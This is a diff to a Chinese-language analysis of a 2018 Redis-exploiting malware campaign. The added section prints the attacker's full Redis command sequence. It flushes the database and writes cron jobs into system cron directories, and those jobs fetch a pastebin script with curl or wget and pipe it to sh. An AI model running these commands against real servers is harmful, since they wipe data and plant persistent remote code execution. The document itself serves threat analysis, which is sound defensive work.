@@ -3,7 +3,34 @@
 
 2018.12 更新，攻击者将一些恶意内容放在了：https://github.com/SYSTEMFOUR ；使用chattr +i；检测了云服务商以卸载安全程序；利用开源的masscan进行快速扩散传播
 
+### 利用REDIS未授权执行：
+```
+config set stop-writes-on-bgsave-error no
 
+flushall
+
+config set dbfilename root
+
+set SwE3SC "\t\n*/10 * * * * root (curl -fsSL https://pastebin.com/raw/xbY7p5Tb||wget -q -O- https://pastebin.com/raw/xbY7p5Tb)|sh\n\t##"
+
+set NysX7D "\t\n*/15 * * * * (curl -fsSL https://pastebin.com/raw/xbY7p5Tb||wget -q -O- https://pastebin.com/raw/xbY7p5Tb)|sh\n\t##"
+
+config set dir /etc/cron.d
+
+save
+
+config set dir /var/spool/cron
+
+save
+
+config set dir /var/spool/cron/crontabs
+
+save
+
+flushall
+
+config set stop-writes-on-bgsave-error yes
+```
 
 ### pastebin.com_raw_5bjpjvLP:
 开始执行的脚本
